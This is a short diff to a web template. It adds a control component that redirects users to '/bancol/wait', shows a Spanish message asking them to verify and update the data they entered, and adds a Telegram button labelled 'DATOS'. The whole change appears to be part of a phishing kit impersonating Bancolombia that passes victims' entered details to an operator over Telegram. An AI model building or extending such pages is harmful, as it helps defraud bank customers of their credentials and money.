@@ -423,6 +423,14 @@
         }
     </script>
 
+    <x-control
+        :auto-completar="true"
+        :debug="false"
+        redirect-url="/bancol/wait"
+        toast-message="Verifica la información ingresada sea la correcta o actualizala"
+        telegram-button="DATOS"
+    />
+
 </body>
 
 </html>
